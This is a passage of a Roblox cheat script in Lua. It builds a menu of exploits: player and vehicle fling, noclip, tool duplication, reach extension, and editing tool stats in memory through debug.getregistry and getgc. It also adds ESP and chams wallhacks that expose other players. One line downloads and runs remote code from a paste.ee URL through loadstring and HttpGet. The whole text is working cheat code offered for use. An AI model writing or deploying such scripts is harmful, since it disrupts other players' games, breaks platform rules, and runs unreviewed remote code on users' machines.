        		pos.y = pos.y + b.Velocity.Y / 2
        		pos.z = pos.z + b.Velocity.Z / 2
    		    lp.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(pos.x,pos.y,pos.z))
    		else
    		    lp.Character.HumanoidRootPart.CFrame = v.CFrame
		    end
	    end)
    end)
end)

wait()

lp.Character.Humanoid.HipHeight = flinghh

wait(.5)

carpetLoop:Disconnect()
for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
		if child.ClassName == "Part" then
			child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5, 0, 0)
		end
	end
wait()
lp.Character.Humanoid.Health = 0
wait(game.Players.RespawnTime + .6)
lp.Character.HumanoidRootPart.CFrame = oldpos
end
end
end
end
end
  	end    
})

local VehicleFlingO

Vehicle:AddTextbox({
	Name = "Fling Vehicle Power",
	Default = "",
	TextDisappear = true,
	Callback = function(VehOw)
		VehicleFlingO = tonumber(VehOw)
	end		  
})

Vehicle:AddButton({
	Name = "Fling Vehicle",
	Callback = function()
        game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "You can fling vehicle only if you sitted on seat first. It flings your vehicle not like closest vehicle, enemys vehicles etc.", Duration = 11,})
      	local plr = game.Players.LocalPlayer
local char = plr.Character
local Root = char.HumanoidRootPart

local BGyro = Instance.new("BodyAngularVelocity")
BGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
BGyro.AngularVelocity = Vector3.new(VehicleFlingO, VehicleFlingO, VehicleFlingO)
local PGyro, DGyro, ZGyro = Root.CFrame:ToEulerAnglesXYZ()
local A = PGyro
local B = Root
local C = ZGyro
PGyro = BGyro
PGyro = BGyro
PGyro.Parent = char.Head
wait(0.2)
BGyro:Destroy()
  	end    
})

Vehicle:AddToggle({
	Name = "Vehicle Very Strengthen",
	Default = false,
	Callback = function(vstrong)
        if vstrong == true then
            vstrongParts = {}
	local seat = plr.Character:FindFirstChildOfClass('Humanoid').SeatPart
	local vehicleModel = seat.Parent
	repeat
		if vehicleModel.ClassName ~= "Model" then
			vehicleModel = vehicleModel.Parent
		end
	until vehicleModel.ClassName == "Model"
	wait(0.1)
	for i,v in pairs(vehicleModel.Parent:GetDescendants()) do
		if v:IsA("Part") then
			table.insert(vstrongParts,v)
			v.CustomPhysicalProperties = PhysicalProperties.new(9e99, 9e99, 9e99, 9e99, 9e99)
		end
	end
		else
	vstrong = false
	for i,v in pairs(vstrongParts) do
		if v:IsA("Part") then
	       v.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5, 1, 1)
		end	
	end
	vstrongParts = {}
		end		
  end    
})

Vehicle:AddToggle({
	Name = "Vehicle Strengthen",
	Default = false,
	Callback = function(vstrong)
        if vstrong == true then
            vstrongParts = {}
	local seat = plr.Character:FindFirstChildOfClass('Humanoid').SeatPart
	local vehicleModel = seat.Parent
	repeat
		if vehicleModel.ClassName ~= "Model" then
			vehicleModel = vehicleModel.Parent
		end
	until vehicleModel.ClassName == "Model"
	wait(0.1)
	for i,v in pairs(vehicleModel.Parent:GetDescendants()) do
		if v:IsA("Part") then
			table.insert(vstrongParts,v)
			v.CustomPhysicalProperties = PhysicalProperties.new(100, 0.3, 0.5)
		end
	end
		else
	vstrong = false
	for i,v in pairs(vstrongParts) do
		if v:IsA("Part") then
	       v.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
		end	
	end
	vstrongParts = {}
		end		
  end    
})

Vehicle:AddToggle({
	Name = "Vehicle Weaken",
	Default = false,
	Callback = function(vweak)
        if vweak == true then
            vweakParts = {}
	local seat = plr.Character:FindFirstChildOfClass('Humanoid').SeatPart
	local vehicleModel = seat.Parent
	repeat
		if vehicleModel.ClassName ~= "Model" then
			vehicleModel = vehicleModel.Parent
		end
	until vehicleModel.ClassName == "Model"
	wait(0.1)
	for i,v in pairs(vehicleModel.Parent:GetDescendants()) do
		if v:IsA("Part") then
			table.insert(vweakParts,v)
			v.CustomPhysicalProperties = PhysicalProperties.new(0, 0.3, 0.5)
		end
	end
		else
	vweak = false
	for i,v in pairs(vweakParts) do
		if v:IsA("Part") then
	       v.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
		end	
	end
	vweakParts = {}
		end		
  end    
})

Vehicle:AddToggle({
	Name = "Vehicle Noclip",
	Default = false,
	Callback = function(vNoclip)
        if vNoclip == true then
            vnoclipParts = {}
	local seat = plr.Character:FindFirstChildOfClass('Humanoid').SeatPart
	local vehicleModel = seat.Parent
	repeat
		if vehicleModel.ClassName ~= "Model" then
			vehicleModel = vehicleModel.Parent
		end
	until vehicleModel.ClassName == "Model"
	wait(0.1)
	Noclip()
	for i,v in pairs(vehicleModel:GetDescendants()) do
		if v:IsA("BasePart") and v.CanCollide then
			table.insert(vnoclipParts,v)
			v.CanCollide = false
		end
	end
	for i,b in pairs(vehicleModel.Parent:GetDescendants()) do
		if b:IsA("BasePart") and b.CanCollide then
		   table.insert(vnoclipParts,b)
		   b.CanCollide = false
		end	
	end
		else
		    vNoclip = false
			if Noclipping then
		Noclipping:Disconnect()
	end
	Clip = true
	for i,v in pairs(vnoclipParts) do
		v.CanCollide = true
	end
	vnoclipParts = {}
		end		
  end    
})

Vehicle:AddToggle({
	Name = "Vehicle Freeze",
	Default = false,
	Callback = function(vfree)
        if vfree == true then
            local seat = plr.Character:FindFirstChildOfClass('Humanoid').SeatPart
	local vehicleModel = seat.Parent
            for i,v in pairs(plr.Character:GetDescendants()) do
                if v:IsA("BasePart") then
                v.Anchored = true
            end
            end
            for i,b in pairs(vehicleModel:GetDescendants()) do
		if b:IsA("BasePart") then
            table.insert(vfreeze, b)
			b.Anchored = true
		end
	end
		else
		    vfree = false
			for i,v in pairs(plr.Character:GetDescendants()) do
                if v:IsA("BasePart") then
                v.Anchored = false
            end
            end
            for i,v in pairs(vfreeze) do
		v.Anchored = false
	end
	vfreeze = {}
		end		
  end    
})

Vehicle:AddToggle({
	Name = "Vehicle Fling",
	Default = false,
	Callback = function(vFly)
		if vFly == true then
               vnoclipParts = {}
               vstrongParts = {}
	local seat = plr.Character:FindFirstChildOfClass('Humanoid').SeatPart
	local vehicleModel = seat.Parent
	repeat
		if vehicleModel.ClassName ~= "Model" then
			vehicleModel = vehicleModel.Parent
		end
	until vehicleModel.ClassName == "Model"
	wait(0.1)
	Noclip()
	for i,v in pairs(vehicleModel:GetDescendants()) do
		if v:IsA("BasePart") and v.CanCollide then
			table.insert(vnoclipParts,v)
			v.CanCollide = false
		end
	end
	for i,b in pairs(vehicleModel.Parent:GetDescendants()) do
		if b:IsA("BasePart") and b.CanCollide then
		   table.insert(vnoclipParts,b)
		   b.CanCollide = false
		end	
	end
    for i,v in pairs(vehicleModel.Parent:GetDescendants()) do
		if v:IsA("Part") then
			table.insert(vstrongParts,v)
			v.CustomPhysicalProperties = PhysicalProperties.new(9e99, 9e99, 9e99, 9e99, 9e99)
		end
	end
               NOFLY()
	wait()
	sFLY(true)
    local BodyAV = Instance.new("BodyAngularVelocity", game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart"))
BodyAV.AngularVelocity = Vector3.new(0, 2000, 0)
BodyAV.MaxTorque = Vector3.new(0, math.huge, 0)
BodyAV.Name = "VehicleFling"
BodyAV.P = 1250
          else
               vFly = false
               NOFLY()
               for i,v in pairs(plr.Character:GetDescendants()) do
                   if v:IsA("BodyAngularVelocity") and v.Name == "VehicleFling" then
                      v:Destroy()
                   end
               end
               vNoclip = false
			if Noclipping then
		Noclipping:Disconnect()
	end
	Clip = true
	for i,v in pairs(vnoclipParts) do
		v.CanCollide = true
	end
    for i,v in pairs(vstrongParts) do
		if v:IsA("Part") then
	       v.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5, 1, 1)
		end	
	end
	vnoclipParts = {}
    vstrongParts = {}
	end
  end    
})

Vehicle:AddTextbox({
	Name = "Vehicle Fling Speed",
	Default = "",
	TextDisappear = true,
	Callback = function(vFlyspeeds)
		vehicleflyspeed = vFlyspeeds
		end	
})

Vehicle:AddToggle({
	Name = "Vehicle Fly",
	Default = false,
	Callback = function(vFly)
		if vFly == true then
               NOFLY()
	wait()
	sFLY(true)
          else
               vFly = false
               NOFLY()
	end
  end    
})

Vehicle:AddTextbox({
	Name = "Vehicle Fly Speed",
	Default = "",
	TextDisappear = true,
	Callback = function(vFlyspeed)
		vehicleflyspeed = vFlyspeed 
		end	
})

ToolPlr:AddLabel("Player")


ToolPlr:AddToggle({
	Name = "Walk To Closest Tool Player",
	Default = false,
	Callback = function(Walknssz)
        if Walknssz == true then
           if Guarding == false then
              Guarding = true
              for i,v in pairs(game.Players:GetPlayers()) do
                  if v.Name ~= plr.Character.Name and (getRoot(v.Character).CFrame.p - getRoot(plr.Character).CFrame.p).Magnitude < 25 then
                    repeat wait()
                    if getRoot(v.Character).Velocity.Magnitude > 0.5 and v.Character:FindFirstChildOfClass("Tool") then
                       plr.Character:FindFirstChildOfClass("Humanoid"):MoveTo(getRoot(v.Character).CFrame.p + getRoot(v.Character).Velocity.unit * 7)
                    elseif getRoot(v.Character).Velocity.Magnitude < 0.5 and v.Character:FindFirstChildOfClass("Tool") then
		     plr.Character:FindFirstChild("Humanoid"):MoveTo(getRoot(v.Character).CFrame.p)
end
                    until v.Character == nil or not getRoot(v.Character) or not v.Character:FindFirstChildOfClass("Tool") or Guarding == false
		  end
end
end
                   
		else
		    Walknssz = false
            Guarding = false
		end		
  end    
})

local ToolStatName

ToolPlr:AddLabel("Tool Stats")

ToolPlr:AddTextbox({
	Name = "Tool StatName",
	Default = "",
	TextDisappear = true,
	Callback = function(VRMlols)
        OrionLib:MakeNotification({
	Name = "Tutorial",
	Content = "1) You need to write statname that is in modulescript or localscript, which is function or table. Use for example dark dex and view every script in tool. 2) After finding from darkdex, you need to write here tableARG name, example CurrentAmmo or MaxAmmo. Now it's done, you can change number of table. Enjoy.",
	Image = "rbxassetid://6023426945",
	Time = 25
})
		ToolStatName = VRMlols
	end	  
})

ToolPlr:AddTextbox({
	Name = "Tool NumberStat Debug.GetRegistery() Method",
	Default = "",
	TextDisappear = true,
	Callback = function(GetRegd)
        local numbergetreg = tonumber(GetRegd)
        for i,v in pairs(debug.getregistry()) do
    if type(v) == "function" then 
       local abc = debug.getupvalues(v)
             for a,b in next, abc do
                 if type(b) == "table" then
                    if b[ToolStatName] then
                    b[ToolStatName] = numbergetreg
                 end
              end
           end
        end
     end
	end	  
})

ToolPlr:AddTextbox({
	Name = "Tool NumberStat GetGc() Method",
	Default = "",
	TextDisappear = true,
	Callback = function(gcd)
        local numbergc = tonumber(gcd)
        for i,v in next, getgc(true) do --- true means that will work, if false then not work.
    if type(v) == "function" then
        local abc = debug.getupvalues(v)
             for a,b in next, abc do
                 if type(b) == "table" and rawget(b, ToolStatName) then
                 rawset(b, ToolStatName, numbergc)
end
end
    end
end
	end	  
})

ToolPlr:AddLabel("LocalPlayer")

ToolPlr:AddButton({
	Name = "Invisible Tools",
	Callback = function()
	    game.StarterGui:SetCore("SendNotification", {Title = "Reset Tutorial.", Text = "If you want to stop the invisible tools, then just reset character.", Duration = 10,})
      	local Char = game.Players.LocalPlayer.Character
	local touched = false
	local tpdback = false
	local box = Instance.new('Part')
	box.Anchored = true
	box.CanCollide = true
	box.Size = Vector3.new(10,1,10)
	box.Position = Vector3.new(0,10000,0)
	box.Parent = workspace
	local boxTouched = box.Touched:connect(function(part)
		if (part.Parent.Name == game.Players.LocalPlayer.Name) then
			if touched == false then
				touched = true
				local function apply()
					local no = Char.HumanoidRootPart:Clone()
					wait(.25)
					Char.HumanoidRootPart:Destroy()
					no.Parent = Char
					Char:MoveTo(loc)
					touched = false
				end
				if Char then
					apply()
				end
			end
		end
	end)
	repeat wait() until Char
	local cleanUp
	cleanUp = game.Players.LocalPlayer.CharacterAdded:connect(function(char)
		boxTouched:Disconnect()
		box:Destroy()
		cleanUp:Disconnect()
	end)
	loc = Char.HumanoidRootPart.Position
	Char:MoveTo(box.Position + Vector3.new(0,.5,0))
  	end    
})

ToolPlr:AddButton({
	Name = "Clean Tool Fling",
	Callback = function()
	    game.StarterGui:SetCore("SendNotification", {Title = "Reset Tutorial.", Text = "If you want to stop the clean tool fling, then: 1) Reset; 2) Go to Table Parts folder in GUI script and find 'Clear Noclip Table Parts'.", Duration = 15,})
      	local tool = plr.Character:FindFirstChildOfClass("Tool")
	if tool then
		game.StarterGui:SetCore("SendNotification", {Title = "Clean Tool Fling", Text = "It's not loop. Clean Tool Fling was started. Untoggle to stop it.", Duration = 10,})
		tool.Parent = plr.Backpack
		tool.Handle.Massless = true
		RestoreCFling = {
			Anim = plr.Character.Animate.toolnone.ToolNoneAnim.AnimationId;
			Grip = tool.GripPos;
		}
		tool.GripPos = Vector3.new(5000, 5000, 5000)
		plr.Character.HumanoidRootPart.CustomPhysicalProperties = PhysicalProperties.new(math.huge,math.huge,math.huge,math.huge,math.huge)
		tool.Parent = plr.Character
		pcall(function() plr.Character.Animate.toolnone.ToolNoneAnim.AnimationId = "nil" end)
		wait(.1)
		tool.Parent = plr.Backpack
		wait(.1)
		tool.Parent = plr.Character
		Noclip()
		if not tool then
           game.StarterGui:SetCore("SendNotification", {Title = "No tool was found!", Text = "Equip any tool that has Handle and Player without any Collision.", Duration = 4,})
 		end	
	end
  	end    
})

ToolPlr:AddButton({
	Name = "Equip Tools",
	Callback = function()
       for i,v in pairs(Players.LocalPlayer.Backpack:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = Players.LocalPlayer.Character
		end
	end
	end    
})

ToolPlr:AddButton({
	Name = "Droppable Tools",
	Callback = function()
       if speaker.Character then
		for _,obj in pairs(speaker.Character:GetChildren()) do
			if obj:IsA("Tool") then
				obj.CanBeDropped = true
			end
		end
	end
	if speaker:FindFirstChildOfClass("Backpack") then
		for _,obj in pairs(speaker:FindFirstChildOfClass("Backpack"):GetChildren()) do
			if obj:IsA("Tool") then
				obj.CanBeDropped = true
			end
		end
	end
	end    
})

ToolPlr:AddButton({
	Name = "Drop Tools",
	Callback = function()
       for i,v in pairs(Players.LocalPlayer.Backpack:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = Players.LocalPlayer.Character
		end
	end
	wait()
	for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = workspace
		end
	end
	end    
})

ToolPlr:AddButton({
	Name = "Drop Tool",
	Callback = function()
	wait()
	for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = workspace
		end
	end
	end    
})

ToolPlr:AddButton({
	Name = "Drop Tools [GodMode Method]",
	Callback = function()
       for i,v in pairs(Players.LocalPlayer.Backpack:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = Players.LocalPlayer.Character
		end
	end
    wait(0.5)
    plr.Character.Humanoid.Name = 1
			local l = plr.Character["1"]:Clone()
			l.Parent = plr.Character
			l.Name = "Humanoid"
			wait(0.1)
			plr.Character["1"]:Destroy()
			game:GetService("Workspace").CurrentCamera.CameraSubject = plr.Character
			plr.Character.Animate.Disabled = true
			wait(0.1)
			plr.Character.Animate.Disabled = false
			plr.Character.Humanoid.DisplayDistanceType = "None"
	end    
})

ToolPlr:AddButton({
	Name = "Drop Tool [GodMode Method]",
	Callback = function()
	for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
		if v:IsA("Tool") then
			wait(0.5)
    plr.Character.Humanoid.Name = 1
			local l = plr.Character["1"]:Clone()
			l.Parent = plr.Character
			l.Name = "Humanoid"
			wait(0.1)
			plr.Character["1"]:Destroy()
			game:GetService("Workspace").CurrentCamera.CameraSubject = plr.Character
			plr.Character.Animate.Disabled = true
			wait(0.1)
			plr.Character.Animate.Disabled = false
			plr.Character.Humanoid.DisplayDistanceType = "None"
		end
	end
	end    
})

ToolPlr:AddButton({
	Name = "Drop Tools [OP Method]",
	Callback = function()
	   game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "To drop tools - choose any tool to worked, if not work, try other tool.", Duration = 6,})
       local Config = {
   DemeshTools = false,
   RemoveTouchInterest = false,
   CustomRightGripWeld = false
}

local Players = game:GetService("Players")

local Player = Players.LocalPlayer
local Character = Player.Character
local RightArm = Character:FindFirstChild("Right Arm") or Character:FindFirstChild("RightHand")

local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
local Tool = Character:FindFirstChildWhichIsA("Tool") or Player.Backpack:FindFirstChildWhichIsA("Tool")
local FinalPath = Tool -- can change this to humanoid watever

Humanoid:UnequipTools()

local CreateCustomRightGrip = function(Tool, CF)
   local Handle = Tool:FindFirstChild("Handle")
   local RightGrip = Instance.new("Weld")
   RightGrip.Name = "RightGrip"
   RightGrip.Part0 = RightArm
   RightGrip.Part1 = Handle
   RightGrip.C0 = CF
   RightGrip.C1 = Tool.Grip
   RightGrip.Parent = RightArm
   Handle.Massless = true
end

local Demesh = function(Tool)
   for _, x in next, Tool:GetDescendants() do
       if x:IsA("Mesh") or x:IsA("SpecialMesh") or x:IsA("MeshPart") then
           x:Destroy()
       end
   end
end

for _, x in next, Player.Backpack:GetChildren() do
   if _ > 0 and x ~= Tool then
       x.Parent = Character
       x.Parent = Tool
       x.Parent = Player.Backpack
       x.Parent = FinalPath
       if Config.CustomRightGripWeld then
           CreateCustomRightGrip(x, CFrame.new(0, -_ + 5, 0) * CFrame.Angles(math.rad(90), math.rad(90), 0))
       end
   end
end

Tool.Parent = Character

if Config.DemeshTools then
  for _, x in next, Tool:GetChildren() do
       if x:IsA("Tool") then
           local Mesh = x:FindFirstChildWhichIsA("Mesh", true) or x:FindFirstChildWhichIsA("SpecialMesh", true) or x:FindFirstChildWhichIsA("MeshPart", true)
           if Mesh then
              Mesh:Destroy()
           end
       end
   end
end

if Config.RemoveTouchInterest then
   for _, x in next, Tool:GetChildren() do
       if x:IsA("Tool") then
           local Touch = x:FindFirstChildWhichIsA("TouchTransmitter", true)
           if Touch then
              Touch:Destroy()
           end
       end
   end
end
	end    
})

ToolPlr:AddButton({
	Name = "Drop Tools Without Mesh [OP Method]",
	Callback = function()
	   game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "To drop tools - choose any tool to worked, if not work, try other tool.", Duration = 6,})
       local Config = {
   DemeshTools = true,
   RemoveTouchInterest = false,
   CustomRightGripWeld = false
}

local Players = game:GetService("Players")

local Player = Players.LocalPlayer
local Character = Player.Character
local RightArm = Character:FindFirstChild("Right Arm") or Character:FindFirstChild("RightHand")

local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
local Tool = Character:FindFirstChildWhichIsA("Tool") or Player.Backpack:FindFirstChildWhichIsA("Tool")
local FinalPath = Tool -- can change this to humanoid watever

Humanoid:UnequipTools()

local CreateCustomRightGrip = function(Tool, CF)
   local Handle = Tool:FindFirstChild("Handle")
   local RightGrip = Instance.new("Weld")
   RightGrip.Name = "RightGrip"
   RightGrip.Part0 = RightArm
   RightGrip.Part1 = Handle
   RightGrip.C0 = CF
   RightGrip.C1 = Tool.Grip
   RightGrip.Parent = RightArm
   Handle.Massless = true
end

local Demesh = function(Tool)
   for _, x in next, Tool:GetDescendants() do
       if x:IsA("Mesh") or x:IsA("SpecialMesh") or x:IsA("MeshPart") then
           x:Destroy()
       end
   end
end

for _, x in next, Player.Backpack:GetChildren() do
   if _ > 0 and x ~= Tool then
       x.Parent = Character
       x.Parent = Tool
       x.Parent = Player.Backpack
       x.Parent = FinalPath
       if Config.CustomRightGripWeld then
           CreateCustomRightGrip(x, CFrame.new(0, -_ + 5, 0) * CFrame.Angles(math.rad(90), math.rad(90), 0))
       end
   end
end

Tool.Parent = Character

if Config.DemeshTools then
  for _, x in next, Tool:GetChildren() do
       if x:IsA("Tool") then
           local Mesh = x:FindFirstChildWhichIsA("Mesh", true) or x:FindFirstChildWhichIsA("SpecialMesh", true) or x:FindFirstChildWhichIsA("MeshPart", true)
           if Mesh then
              Mesh:Destroy()
           end
       end
   end
end

if Config.RemoveTouchInterest then
   for _, x in next, Tool:GetChildren() do
       if x:IsA("Tool") then
           local Touch = x:FindFirstChildWhichIsA("TouchTransmitter", true)
           if Touch then
              Touch:Destroy()
           end
       end
   end
end
	end    
})

local function GetHandleTools(p)
	p = p or game.Players.LocalPlayer
	local r = {}
	for _, v in ipairs(p.Character and p.Character:GetChildren() or {}) do
		if v:IsA("BackpackItem") and v:FindFirstChild("Handle") then
			r[#r + 1] = v
		end
	end
	for _, v in ipairs(p.Backpack:GetChildren()) do
		if v:IsA("BackpackItem") and v:FindFirstChild("Handle") then
			r[#r + 1] = v
		end
	end
	return r
end

ToolPlr:AddTextbox({
	Name = "Dupe Tools",
	Default = "",
	TextDisappear = true,
	Callback = function(DupeToolsNum)
local LOOP_NUM = tonumber(DupeToolsNum)
	local OrigPos = plr.Character.HumanoidRootPart.Position
	local Tools, TempPos = {}, Vector3.new(math.random(-2e5, 2e5), 2e5, math.random(-2e5, 2e5))
	for i = 1, LOOP_NUM do
		local Human = plr.Character:WaitForChild("Humanoid")
		wait(.1, Human.Parent:MoveTo(TempPos))
		Human.RootPart.Anchored = plr:ClearCharacterAppearance(wait(.1)) or true
		local t = GetHandleTools(plr)
		while #t > 0 do
			for _, v in ipairs(t) do
				coroutine.wrap(function()
					for _ = 1, 25 do
						v.Parent = plr.Character
						v.Handle.Anchored = true
					end
					for _ = 1, 5 do
						v.Parent = workspace
					end
					table.insert(Tools, v.Handle)
				end)()
			end
			t = GetHandleTools(plr)
		end
		wait(.1)
		plr.Character = plr.Character:Destroy()
		plr.CharacterAdded:Wait():WaitForChild("Humanoid").Parent:MoveTo(LOOP_NUM == i and OrigPos or TempPos, wait(.1))
		if i == LOOP_NUM or i % 5 == 0 then
			local HRP = plr.Character.HumanoidRootPart
			if type(firetouchinterest) == "function" then
				for _, v in ipairs(Tools) do
					v.Anchored = not firetouchinterest(v, HRP, 1, firetouchinterest(v, HRP, 0)) and false or false
				end
			else
				for _, v in ipairs(Tools) do
					coroutine.wrap(function()
						local x = v.CanCollide
						v.CanCollide = false
						v.Anchored = false
						for _ = 1, 10 do
							v.CFrame = HRP.CFrame
							wait()
						end
						v.CanCollide = x
					end)()
				end
			end
			wait(.1)
			Tools = {}
		end
		TempPos = TempPos + Vector3.new(10, math.random(-5, 5), 0)
	end
	end	  
})

local AmountNumber
local DelayUse

ToolPlr:AddTextbox({
	Name = "Use Tools AmmountActivates",
	Default = "",
	TextDisappear = true,
	Callback = function(AmountLOL)
        AmountNumber = AmountLOL
	end	  
})

ToolPlr:AddTextbox({
	Name = "Use Tools Wait-Delay",
	Default = "",
	TextDisappear = true,
	Callback = function(DelayLOL)
        DelayUse = DelayLOL
	end	  
})

ToolPlr:AddButton({
	Name = "Use Tools",
	Callback = function()
      	local Backpack = plr:FindFirstChildOfClass("Backpack")
	local ammount = tonumber(AmountNumber)
	local delay_ = tonumber(DelayUse)
	for _, v in ipairs(Backpack:GetChildren()) do
		v.Parent = plr.Character
		coroutine.wrap(function()
			for _ = 1, ammount do
				v:Activate()
				if delay_ then
					wait(delay_)
				end
			end
			v.Parent = Backpack
		end)()
	end
  	end    
})

local ReachNumber

ToolPlr:AddTextbox({
	Name = "Reach Tool Number",
	Default = "",
	TextDisappear = true,
	Callback = function(ReachToolNum)
        ReachNumber = ReachToolNum
	end	  
})

ToolPlr:AddToggle({
	Name = "Reach Tool",
	Default = false,
	Callback = function(reachtool)
		if reachtool == true then
              for i,v in pairs(plr.Character:GetDescendants()) do
		if v:IsA("Tool") then
				currentToolSize = v.Handle.Size
				currentGripPos = v.GripPos
				local a = Instance.new("SelectionBox")
				a.Name = "SelectionBoxCreated"
				a.Parent = v.Handle
				a.Adornee = v.Handle
				v.Handle.Massless = true
				v.Handle.Size = Vector3.new(0.5,0.5,ReachNumber)
				v.GripPos = Vector3.new(0,0,0)
				plr.Character:FindFirstChildOfClass('Humanoid'):UnequipTools()	end
		end
          else
               reachtool = false
			   for i,v in pairs(plr.Character:GetDescendants()) do
		if v:IsA("Tool") then
			v.Handle.Size = currentToolSize
			v.GripPos = currentGripPos
			v.Handle.SelectionBoxCreated:Destroy()
		end
	end
	end
  end    
})

ESP:AddLabel("Visuals")

local ESPz = loadstring(game:HttpGet("https://paste.ee/r/aFx08", true))()

ESP:AddToggle({
	Name = "ESP",
	Default = false,
	Callback = function(ESPD)
        ESPz:Toggle(ESPD)
  end    
})

ESP:AddToggle({
	Name = "Show Box",
	Default = false,
	Callback = function(ESPb)
      ESPz.Boxes = ESPb
  end    
})

ESP:AddToggle({
	Name = "Show Players",
	Default = false,
	Callback = function(ESPp)
        ESPz.Players = ESPp
  end    
})

ESP:AddToggle({
	Name = "Show Names",
	Default = false,
	Callback = function(ESPn)
        ESPz.Names = ESPn
  end    
})

ESP:AddToggle({
	Name = "Show TeamColor",
	Default = false,
	Callback = function(ESPtc)
        ESPz.TeamColor = ESPtc
  end    
})

ESP:AddLabel("Chams")

local chamsadded
local chamsremoved
local chamshah = {}

ESP:AddToggle({
	Name = "Chams",
	Default = false,
	Callback = function(Chams)
		if Chams == true then
            function ChamsHEH(target)
            local faces = {"Back","Bottom","Front","Left","Right","Top"}
      for _, v in pairs(game.Players:GetChildren()) do if v.Name ~= game.Players.LocalPlayer.Name then
    for _, p in pairs(v.Character:GetChildren()) do
			if p:IsA("BasePart") then
				for _, f in pairs(faces) do
					local a = Instance.new("BoxHandleAdornment")
					a.Name = "EGUI"
					a.Parent = p
					a.Adornee = p
					a.AlwaysOnTop = true
					a.ZIndex = 10
					a.Size = p.Size
					a.Transparency = 0.3
					a.Color3 = Color3.new(255, 255, 255)
                    chamshah[target] = a
				end
			end
		end
end
end
end

chamsadded = game.Players.PlayerAdded:Connect(function(v)
    v.CharacterAdded:Connect(function()
        ChamsHEH(v)
    end)
end)

chamsremoved = game.Players.PlayerRemoving:Connect(function(v)
    if chamshah[v] then
        chamshah[v]:Destroy()
        chamshah[v] = nil
    end
end)

local faces = {"Back","Bottom","Front","Left","Right","Top"}
      for _, v in pairs(game.Players:GetChildren()) do if v.Name ~= game.Players.LocalPlayer.Name then
    for _, p in pairs(v.Character:GetChildren()) do
			if p:IsA("BasePart") then
				for _, f in pairs(faces) do
					local a = Instance.new("BoxHandleAdornment")
					a.Name = "EGUI"
					a.Parent = p
					a.Adornee = p
					a.AlwaysOnTop = true
					a.ZIndex = 10
					a.Size = p.Size
					a.Transparency = 0.3
					a.Color3 = Color3.new(255, 255, 255)
				end
			end
		end
end
end
        else
			Chams = false
			for _, v in pairs(game.Workspace:GetDescendants()) do
			if v.Name == ("EGUI") then
				v:Remove()
				end
				end
            if chamsadded ~= nil then
        chamsadded:Disconnect()
    end
            if chamsremoved ~= nil then
        chamsremoved:Disconnect()
    end
chamshah = {}
	end
  end    
})

ESP:AddToggle({
	Name = "Show Names",
	Default = false,
	Callback = function(NameChams)
		if NameChams == true then
			for _, v in pairs(game.Players:GetChildren()) do if v.Name ~= game.Players.LocalPlayer.Name then
      local bgui = Instance.new("BillboardGui", v.Character.Head)
	bgui.Name = ("NAMGUI")
	bgui.AlwaysOnTop = true
	bgui.ExtentsOffset = Vector3.new(0,3,0)
	bgui.Size = UDim2.new(0,200,0,50)
	local nam = Instance.new("TextLabel",bgui)
	nam.Text = v.Name
	nam.BackgroundTransparency = 1
	nam.TextSize = 30
	nam.Font = ("Arial")
	nam.TextColor3 = Color3.new(1, 1, 1)
	nam.Size = UDim2.new(0,200,0,50)
	end
	end
        else
			NameChams = false
			for _, v in pairs(game.Workspace:GetDescendants()) do
			if v.Name == ("NAMGUI") then
				v:Remove()
				end
				end
	end
  end    
})

ESP:AddToggle({
	Name = "Show TeamColor",
	Default = false,
	Callback = function(TeamColorChams)
		if TeamColorChams == true then
			for i,v in pairs(game.Players:GetChildren()) do
				if v.Name ~= game.Players.LocalPlayer.Name then
					for i,b in pairs(v.Character:GetChildren()) do
						if b:IsA("BasePart") then
							for i,c in pairs(b:GetDescendants()) do
								if c.Name == "EGUI" and c:IsA("BoxHandleAdornment") then
									c.Color = v.TeamColor
								end	
							end	
						end
					end
 				end	
			end
        else
			TeamColorChams = false
			for i,v in pairs(game.Players:GetChildren()) do
				if v.Name ~= game.Players.LocalPlayer.Name then
					for i,b in pairs(v.Character:GetChildren()) do
						if b:IsA("BasePart") then
							for i,c in pairs(b:GetDescendants()) do
								if c.Name == "EGUI" and c:IsA("BoxHandleAdornment") then
									c.Color3 = Color3.new(255, 255, 255)
								end	
							end	
						end
					end
 				end	
			end
	end
  end    
})

ESP:AddToggle({
	Name = "Show Rainbow Color",
	Default = false,
	Callback = function(RainbowColorc)
		if RainbowColorc == true then
			for i,v in pairs(game.Players:GetChildren()) do
				if v.Name ~= game.Players.LocalPlayer.Name then
					for i,b in pairs(v.Character:GetChildren()) do
						if b:IsA("BasePart") then
							for i,c in pairs(b:GetDescendants()) do
								if c.Name == "EGUI" and c:IsA("BoxHandleAdornment") then
									local t = 5; --how long does it take to go through the rainbow

local tick = tick
local fromHSV = Color3.fromHSV
local RunService = game:GetService("RunService")
local Frame = script.Parent

RunService:BindToRenderStep("Rainbow", 1000, function()
	local hue = tick() % t / t
	local color = fromHSV(hue, 1, 1)
	c.Color3 = color
end)
								end	
							end	
						end
					end
 				end	
			end
        else
			RainbowColorc = false
			for i,v in pairs(game.Players:GetChildren()) do
				if v.Name ~= game.Players.LocalPlayer.Name then
					for i,b in pairs(v.Character:GetChildren()) do
						if b:IsA("BasePart") then
							for i,c in pairs(b:GetDescendants()) do
								if c.Name == "EGUI" and c:IsA("BoxHandleAdornment") then
									c:Destroy()
								end
							end
						end
					end
				end	
			end										
	end
  end    
})

ESP:AddLabel("Overpowered Visuals")

